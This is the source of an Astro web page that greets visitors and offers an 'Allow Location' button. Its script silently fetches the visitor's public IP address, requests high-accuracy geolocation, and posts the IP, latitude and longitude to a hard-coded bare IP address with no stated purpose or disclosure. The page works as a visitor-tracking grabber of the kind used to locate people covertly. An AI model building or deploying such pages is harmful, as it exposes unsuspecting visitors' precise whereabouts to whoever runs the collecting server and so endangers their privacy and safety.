import Layout from '../layouts/Layout.astro';
---

<Layout>
  <main>
    <h1>Welcome!</h1>
    <div id="visitor-info">Click to share your location</div>
    <button id="get-location" style="padding: 10px; margin-top: 10px;">Allow Location</button>
    <div id="map-container" style="display:none; width: 100%; height: 400px; margin-top: 20px;"></div>
  </main>

  <script>
    document.addEventListener('DOMContentLoaded', () => {
      async function fetchIP() {
        try {
          const response = await fetch('https://api.ipify.org?format=json');
          if (!response.ok) throw new Error('Failed to fetch IP address');
          const data = await response.json();
          return data.ip;
        } catch (error) {
          console.error('Error fetching IP:', error);
          return 'Unknown IP';
        }
      }

      async function getVisitorInfo() {
        const ipAddress = await fetchIP();
        
        if (!navigator.geolocation) {
          document.getElementById('visitor-info').textContent = "Geolocation is not supported by this browser.";
          return;
        }

        navigator.geolocation.getCurrentPosition(
          async (position) => {
            try {
              const latitude = position.coords.latitude;
              const longitude = position.coords.longitude;

              // Send data to backend
              const response = await fetch('https://95.111.255.206/send-location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ip: ipAddress, latitude, longitude }),
              });

              if (!response.ok) throw new Error(`Server error: ${response.status}`);
              const result = await response.json();

              document.getElementById('visitor-info').textContent = `IP: ${ipAddress}, Latitude: ${latitude}, Longitude: ${longitude}`;
              console.log('Location sent:', result);
            } catch (error) {
              console.error('Error processing location:', error);
            }
          },
          (error) => {
            if (error.code === error.PERMISSION_DENIED) {
              document.getElementById('visitor-info').textContent = "Location access denied. Please enable it in settings.";
            } else {
              console.error("Geolocation error:", error);
            }
          },
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      }

      document.getElementById('get-location').addEventListener('click', getVisitorInfo);
    });
  </script>
</Layout>
